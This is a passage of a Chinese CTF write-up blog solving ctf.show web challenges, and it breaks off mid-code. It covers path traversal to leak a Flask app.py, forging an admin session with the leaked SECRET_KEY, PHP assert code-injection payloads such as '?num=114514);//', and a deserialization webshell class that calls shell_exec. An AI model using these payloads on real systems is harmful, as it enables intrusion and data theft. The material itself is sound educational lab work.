href="https://blog.csdn.net/weixin_45007073/article/details/113466902#:~:text=%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%201%20%E5%9C%A8URL%E5%86%85%E4%B8%8D%E8%A6%81%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E7%A7%B0%E4%BD%9C%E4%B8%BA%E5%8F%82%E6%95%B0%202%20%E6%A3%80%E6%9F%A5%E4%BD%BF%E7%94%A8%E8%80%85%E8%BE%93%E5%85%A5%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8D%E6%98%AF%E5%90%A6%E6%9C%89%E2%80%9C%E2%80%A6%E2%80%9D%E7%9A%84%E7%9B%AE%E5%BD%95%E9%98%B6%E5%B1%82%E5%AD%97%E7%AC%A6%203,%E5%9C%A8php.ini%E6%96%87%E4%BB%B6%E4%B8%AD%E8%AE%BE%E7%BD%AEopen_basedir%E6%9D%A5%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6%E7%9A%84%E7%9B%AE%E5%BD%95%204%20%E4%BD%BF%E7%94%A8realpath%E5%87%BD%E6%95%B0%E6%9D%A5%E5%B1%95%E5%BC%80%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E4%B8%AD%E7%9A%84%E2%80%9C.%2F%E2%80%9D%E3%80%81%20%E2%80%9C%E2%80%A6%2F%E2%80%9D%E7%AD%89%E5%AD%97%E7%AC%A6%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%94%E5%9B%9E%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E5%90%8D%E7%A7%B0%205%20%E4%BD%BF%E7%94%A8basename%E5%87%BD%E6%95%B0%E6%9D%A5%E8%BF%94%E5%9B%9E%E4%B8%8D%E5%8C%85%E5%90%AB%E8%B7%AF%E5%BE%84%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8D%E7%A7%B0">ÁõÆÂΩïÁ©øË∂ä</a>ËÆøÈóÆ<code>http://c5911a6c-20fd-4771-b630-967baf205874.challenge.ctf.show/download?file=../../app.py</code>ÂæóÂà∞app.pyÊñá‰ª∂</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># !/usr/bin/env python</span><span class="token comment"># -*-coding:utf-8 -*-</span><span class="token triple-quoted-string string">"""# File       : app.py# Time       Ôºö2022/11/07 09:16# Author     Ôºög4_simon# version    Ôºöpython 3.9.7# DescriptionÔºöÊäΩËÄÅÂ©ÜÔºåÂìáÂÅ∂~"""</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> os<span class="token keyword">import</span> random<span class="token keyword">from</span> flag <span class="token keyword">import</span> flag<span class="token comment">#ÂàùÂßãÂåñÂÖ®Â±ÄÂèòÈáè</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'tanji_is_A_boy_Yooooooooooooooooooooo!'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getwifi'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getwifi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span>    wifi<span class="token operator">=</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'static/img'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'current_wifi'</span><span class="token punctuation">]</span><span class="token operator">=</span>wifi    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'getwifi.html'</span><span class="token punctuation">,</span>wifi<span class="token operator">=</span>wifi<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/download'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     filename<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> filename<span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">"‰Ω†ÊÉ≥Âπ≤‰ªÄ‰πàÔºü"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">'static/img/'</span><span class="token operator">+</span>filename<span class="token punctuation">,</span>as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/secret_path_U_never_know'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span>flag<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">"‰Ω†ÊÄé‰πàÁü•ÈÅìËøô‰∏™Ë∑ØÂæÑÁöÑÔºü‰∏çËøáËøòÂ•ΩÊàëÊúâË∫´‰ªΩÈ™åËØÅ"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÁúãÂ§ß‰Ω¨ÁöÑwpÂéüÊù•ÊòØflaskÁöÑsessionËÆ§ËØÅÈ¢òÁõÆÔºåÈúÄË¶ÅÂú®ÁîüÊàê‰∏Ä‰∏™cookieÊâçËÉΩÂæóÂà∞flag„ÄÇ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/secret_path_U_never_know'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span>flag<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">"‰Ω†ÊÄé‰πàÁü•ÈÅìËøô‰∏™Ë∑ØÂæÑÁöÑÔºü‰∏çËøáËøòÂ•ΩÊàëÊúâË∫´‰ªΩÈ™åËØÅ"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÁúãÂà∞ËøôÂè•ÊâæÂà∞‰∏Ä‰∏™Ë∑ØÂæÑ</p><p><img src="https://img-blog.csdnimg.cn/57f0cfe9178e4930ad0c0a8885f3a123.png" alt="1"><br>ËøòÊúâË∫´‰ªΩÈ™åËØÅÔºüÁúã‰∫Ü‰ª£Á†ÅÂ∞±Áü•ÈÅìË¶Åsession‰∏≠ÁöÑisadmin‰∏∫Áúü„ÄÇÈáåÈù¢Á≠æÂêçË¶ÅÁî®Âà∞SECRET_KEYÔºõ‰∫éÊòØÊàë‰ª¨Â∞ÜisadminÁöÑÂÄºÊõ¥ÊîπÂêéÔºå‰ΩøÁî®ÂØÜÈí•SECRET_KEYÈáçÊñ∞Âä†ÂØÜÁîüÊàê‰∏Ä‰∏™session„ÄÇ<br><a href="https://github.com/noraj/flask-session-cookie-manager">githubÂºÄÊ∫êËÑöÊú¨</a>ÔºåÂú®kali‰∏≠ÊâßË°åËÑöÊú¨<br><img src="https://img-blog.csdnimg.cn/7eea38bdf10a46e58e10b3f7980efa98.png" alt="2"><br>ÂæóÂà∞Êñ∞ÁöÑsessionÔºåÁÑ∂ÂêéËÆøÈóÆ<code>http://9bae1f73-6d1c-4258-a734-cf6bed842746.challenge.ctf.show/secret_path_U_never_know</code><br>Áî®hackbarÊõ¥ÊîπcookieÂ§¥ÔºåsessionÊîπ‰∏∫Êñ∞ÁîüÊàêÁöÑ„ÄÇÂæóÂà∞flag„ÄÇ</p><h2 id="‰∏ÄË®ÄÊó¢Âá∫"><a href="#‰∏ÄË®ÄÊó¢Âá∫" class="headerlink" title="‰∏ÄË®ÄÊó¢Âá∫"></a>‰∏ÄË®ÄÊó¢Âá∫</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>  <span class="token comment">//Â∞Üflag.phpÊñá‰ª∂ÂåÖÂê´Âú®ÂΩìÂâçËÑöÊú¨‰∏≠</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">114514</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">assert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"intval(<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span>num<span class="token punctuation">]</span></span>)==1919810"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"‰∏ÄË®ÄÊó¢Âá∫ÔºåÈ©∑È©¨ÈöæËøΩ!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂèØ‰ª•ÁúãÂà∞Ôºåget‰º†ÂÖ•numÔºåÂÖàÂà§Êñ≠numÂÄºÊòØÂê¶Á≠â‰∫é114514ÔºåÊòØÁöÑËØùÊâßË°å‰∏ãÈù¢ËØ≠Âè•„ÄÇ<br><code>assert(&quot;intval($_GET[num])==1919810&quot;) or die(&quot;‰∏ÄË®ÄÊó¢Âá∫ÔºåÈ©∑È©¨ÈöæËøΩ!&quot;);</code><br>Ê≠§ËØ≠Âè•ÂÖàÂ∞Ü GET ËØ∑Ê±Ç‰∏≠ÁöÑÂèÇÊï∞ num ËΩ¨Êç¢‰∏∫Êï¥Êï∞ÔºåÁÑ∂ÂêéÂà§Êñ≠ÊòØÂê¶Á≠â‰∫é 1919810„ÄÇÂ¶ÇÊûúÁõ∏Á≠âÔºåÂàôÁªßÁª≠ÊâßË°å‰∏ãÈù¢ÁöÑ‰ª£Á†ÅÔºõÂê¶ÂàôÔºåËæìÂá∫ÈîôËØØ‰ø°ÊÅØÂπ∂ÁªàÊ≠¢ËÑöÊú¨ÁöÑÊâßË°å„ÄÇ<br><strong>ÈÇ£‰πàÊàë‰ª¨ÂèØ‰ª•ÊèêÁªàÊ≠¢ËÑöÊú¨ÁöÑÊâßË°å</strong>Ôºå‰πüÂ∞±ÊòØ‰º†ÂÖ•<code>?num=114514);//</code>Áî±‰∫éÂú®php‰∏≠Êàë‰ª¨‰º†ÂÖ•ÁöÑ<code>114514);//</code>Âè™‰ºöËæ®Âà´Âá∫ÂâçÈù¢ÁöÑÊï∞Â≠ó<strong>114514</strong>ÂÜçÊâßË°å<strong>assert</strong>Ê≠§Êó∂ËØ≠Âè•ÊèêÂâçÈó≠ÂêàÔºå‰πüÂ∞±ÊòØ<code>assert(&quot;intval($_GET114514);//)==1919810&quot;) or die(&quot;‰∏ÄË®ÄÊó¢Âá∫ÔºåÈ©∑È©¨ÈöæËøΩ!&quot;);</code>ÂêéÈù¢Ë¢´Ê≥®ÈáäÊéâ‰∫ÜÁõ¥Êé•ÊâßË°å<code>echo $flag;</code>ÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/da7eab8fd3c44e4bb95ac6cf0a9cf4f3.png" alt="1"></p><blockquote><p>php‰∏≠ÂÖ∂‰∏≠‰∏§ÁßçÊØîËæÉÁ¨¶Âè∑:<br>&#x3D;&#x3D;ÔºöÂÖàÂ∞ÜÂ≠óÁ¨¶‰∏≤Á±ªÂûãËΩ¨ÂåñÊàêÁõ∏ÂêåÔºåÂÜçÊØîËæÉ<br>&#x3D;&#x3D;&#x3D;ÔºöÂÖàÂà§Êñ≠‰∏§ÁßçÂ≠óÁ¨¶‰∏≤ÁöÑÁ±ªÂûãÊòØÂê¶Áõ∏Á≠âÔºåÂÜçÊØîËæÉ<br>Â≠óÁ¨¶‰∏≤ÂíåÊï∞Â≠óÊØîËæÉ‰ΩøÁî®&#x3D;&#x3D;Êó∂,Â≠óÁ¨¶‰∏≤‰ºöÂÖàËΩ¨Êç¢‰∏∫Êï∞Â≠óÁ±ªÂûãÂÜçÊØîËæÉ<br>var_dump(‚Äòa‚Äô &#x3D;&#x3D; 0);&#x2F;&#x2F;trueÔºåÊ≠§Êó∂aÂ≠óÁ¨¶‰∏≤Á±ªÂûãËΩ¨ÂåñÊàêÊï∞Â≠óÔºåÂõ†‰∏∫aÂ≠óÁ¨¶‰∏≤ÂºÄÂ§¥‰∏≠Ê≤°ÊúâÊâæÂà∞Êï∞Â≠óÔºåÊâÄ‰ª•ËΩ¨Êç¢‰∏∫0<br>var_dump(‚Äò123a‚Äô &#x3D;&#x3D; 123);&#x2F;&#x2F;trueÔºåËøôÈáå‚Äô123a‚Äô‰ºöË¢´ËΩ¨Êç¢‰∏∫123<br>var_dump(‚Äòa123‚Äô &#x3D;&#x3D; 123);&#x2F;&#x2F;falseÔºåÂõ†‰∏∫php‰∏≠ÊúâËøôÊ†∑‰∏Ä‰∏™ËßÑÂÆöÔºöÂ≠óÁ¨¶‰∏≤ÁöÑÂºÄÂßãÈÉ®ÂàÜÂÜ≥ÂÆö‰∫ÜÂÆÉÁöÑÂÄºÔºåÂ¶ÇÊûúËØ•Â≠óÁ¨¶‰∏≤‰ª•ÂêàÊ≥ïÁöÑÊï∞Â≠óÂºÄÂßãÔºåÂàô‰ΩøÁî®ËØ•Êï∞Â≠óËá≥ÂíåÂÆÉËøûÁª≠ÁöÑÊúÄÂêé‰∏Ä‰∏™Êï∞Â≠óÁªìÊùüÔºåÂê¶ÂàôÂÖ∂ÊØîËæÉÊó∂Êï¥‰ΩìÂÄº‰∏∫0„ÄÇ</p></blockquote><p>ËøòÂèØ‰ª•‰ΩøÁî®ËøêÁÆóÊ≥ï<code>/?num=114514%2B1805296</code>Âä†Âè∑Ë¢´urlÁºñÁ†Å**%2B**‰πüÂèØÂæóÂà∞flag„ÄÇ</p><h2 id="È©∑È©¨ÈöæËøΩ"><a href="#È©∑È©¨ÈöæËøΩ" class="headerlink" title="È©∑È©¨ÈöæËøΩ"></a>È©∑È©¨ÈöæËøΩ</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">114514</span> <span class="token operator">&amp;&amp;</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>              <span class="token function">assert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"intval(<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span>num<span class="token punctuation">]</span></span>)==1919810"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"‰∏ÄË®ÄÊó¢Âá∫ÔºåÈ©∑È©¨ÈöæËøΩ!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]|\;|\(|\)/"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>ÂÖ∂‰∏≠Ôºåcheck() ÂáΩÊï∞ÁöÑ‰ΩúÁî®ÊòØÊ£ÄÊü•ËæìÂÖ•ÁöÑÂ≠óÁ¨¶‰∏≤‰∏≠ÊòØÂê¶ÂåÖÂê´Â≠óÊØç„ÄÅÂàÜÂè∑„ÄÅÊã¨Âè∑Á≠âÁâπÊÆäÂ≠óÁ¨¶„ÄÇÂ¶ÇÊûúÊ≤°ÊúâÂåÖÂê´Ëøô‰∫õÂ≠óÁ¨¶ÔºåÂàôËøîÂõû trueÔºåÂê¶ÂàôËøîÂõû false„ÄÇ</p></blockquote><p>ÂÖàËØ¥‰∏ÄÁßçËß£Ê≥ïÔºåÂíå‰∏ä‰∏ÄÈ¢òÊ≥ï‰∫å‰∏ÄÊ†∑</p><blockquote><p>ÂèØ‰ª•‰ΩøÁî®ËøêÁÆóÊ≥ï<code>/?num=114514%2B1805296</code>Âä†Âè∑Ë¢´urlÁºñÁ†Å**%2B**‰πüÂèØÂæóÂà∞flag„ÄÇ</p></blockquote><h3 id="chatgptÂØπ‰ª£Á†ÅÁöÑÂàÜÊûê"><a href="#chatgptÂØπ‰ª£Á†ÅÁöÑÂàÜÊûê" class="headerlink" title="chatgptÂØπ‰ª£Á†ÅÁöÑÂàÜÊûê"></a>chatgptÂØπ‰ª£Á†ÅÁöÑÂàÜÊûê</h3><blockquote><p>ËØ•‰ª£Á†ÅÁöÑ‰ΩúÁî®ÊòØÊé•Âèó‰∏Ä‰∏™Âêç‰∏∫ ‚Äúnum‚Äù ÁöÑ GET ËØ∑Ê±ÇÂèÇÊï∞ÔºåÂ¶ÇÊûúÂèÇÊï∞ÂÄºÁ≠â‰∫é 114514 Âπ∂‰∏îÁªèËøá check()<br>ÂáΩÊï∞Ê£ÄÊü•Ê≤°ÊúâÂåÖÂê´Â≠óÊØç„ÄÅÂàÜÂè∑„ÄÅÊã¨Âè∑Á≠âÁâπÊÆäÂ≠óÁ¨¶ÔºåÂàô‰ºöËæìÂá∫ $flag ÂèòÈáèÁöÑÂÄº„ÄÇ</p><p>ÂÖ∂‰∏≠Ôºåcheck() ÂáΩÊï∞ÁöÑ‰ΩúÁî®ÊòØÊ£ÄÊü•ËæìÂÖ•ÁöÑÂ≠óÁ¨¶‰∏≤‰∏≠ÊòØÂê¶ÂåÖÂê´Â≠óÊØç„ÄÅÂàÜÂè∑„ÄÅÊã¨Âè∑Á≠âÁâπÊÆäÂ≠óÁ¨¶„ÄÇÂ¶ÇÊûúÊ≤°ÊúâÂåÖÂê´Ëøô‰∫õÂ≠óÁ¨¶ÔºåÂàôËøîÂõû trueÔºåÂê¶ÂàôËøîÂõû<br>false„ÄÇ</p><p>‰∏çËøáÂú®Á¨¨ 6 Ë°å‰ª£Á†Å‰∏≠Ôºå‰ΩøÁî®‰∫Ü assert() ÂáΩÊï∞Êù•Âà§Êñ≠ $_GET[‚Äònum‚Äô] ÊòØÂê¶Á≠â‰∫é<br>1919810ÔºåÂ¶ÇÊûú‰∏çÁ≠â‰∫éÂ∞±‰ºöËæìÂá∫‰∏ÄÊÆµÊèêÁ§∫‰ø°ÊÅØÂπ∂ÁªàÊ≠¢Á®ãÂ∫èËøêË°å„ÄÇÊ≥®ÊÑèÂà∞ assert()<br>ÂáΩÊï∞ÊòØ‰∏Ä‰∏™ÈùûÂ∏∏Âç±Èô©ÁöÑÂáΩÊï∞ÔºåÂõ†‰∏∫ÂÆÉ‰ºöÂ∞ÜÂ≠óÁ¨¶‰∏≤ÂèÇÊï∞ÂΩì‰Ωú‰ª£Á†ÅÊâßË°åÔºåÂõ†Ê≠§Â¶ÇÊûúÂú®ËæìÂÖ• $_GET[‚Äònum‚Äô]<br>ÁöÑÊó∂ÂÄô‰º†ÂÖ•‰∫Ü‰∏Ä‰∫õÁâπÊÆäÂ≠óÁ¨¶ÔºåÂ∞±ÂèØËÉΩÂØºËá¥‰ª£Á†ÅÊâßË°åÊºèÊ¥û„ÄÇ</p><p>Áî±‰∫é‰ª£Á†Å‰∏≠ÂåÖÂê´‰∫Ü flag.php Êñá‰ª∂ÔºåÂõ†Ê≠§Êàë‰ª¨Êó†Ê≥ïÂæóÁü• $flag ÂèòÈáèÁöÑÂÄº„ÄÇ‰∏çËøáÂèØ‰ª•Â∞ùËØïÊûÑÈÄ†Á¨¶ÂêàÊù°‰ª∂ÁöÑ $_GET[‚Äònum‚Äô]<br>ÂèÇÊï∞Ôºå‰ΩøÂæóÁ®ãÂ∫èËæìÂá∫ $flag ÂèòÈáèÁöÑÂÄº„ÄÇÊ≥®ÊÑèÂà∞ check()<br>ÂáΩÊï∞‰∏≠Âè™Ê£ÄÊü•‰∫ÜÂ≠óÊØç„ÄÅÂàÜÂè∑„ÄÅÊã¨Âè∑Á≠âÁâπÊÆäÂ≠óÁ¨¶ÔºåÂõ†Ê≠§ÂèØ‰ª•‰ΩøÁî®Êï∞Â≠ó„ÄÅÂä†Âè∑„ÄÅÂáèÂè∑Á≠âÂ∏∏ËßÑÂ≠óÁ¨¶Êù•ÊûÑÈÄ†ÂèÇÊï∞„ÄÇ</p></blockquote><h2 id="TapTapTap"><a href="#TapTapTap" class="headerlink" title="TapTapTap"></a>TapTapTap</h2><blockquote><p>ÁΩëÈ°µÊ∏∏ÊàèÁ±ªÁöÑÈ¢òÁõÆÁõ¥Êé•Êü•ÁúãÂÖ∂Ê∫ê‰ª£Á†Å„ÄÇ</p></blockquote><p>Âú®jsÊñá‰ª∂ÈáåÁúãÂà∞Êúâbase64Âä†ÂØÜÁöÑÂÜÖÂÆπ„ÄÇËß£Á†ÅÁúãÁúã„ÄÇ<br><img src="https://img-blog.csdnimg.cn/5c5b3b1d2ec643d0a963c33a2fa414c7.png" alt="2"></p><blockquote><p>Your flag is in &#x2F;secret_path_you_do_not_know&#x2F;secretfile.txt</p></blockquote><p>Áõ¥Êé•ËÆøÈóÆÂæóÂà∞flag„ÄÇ</p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p><strong>ËÄÉÁÇπÔºöÂèçÂ∫èÂàóÂåñ</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Webshell</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo "Hello World!"'</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$serializecmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string 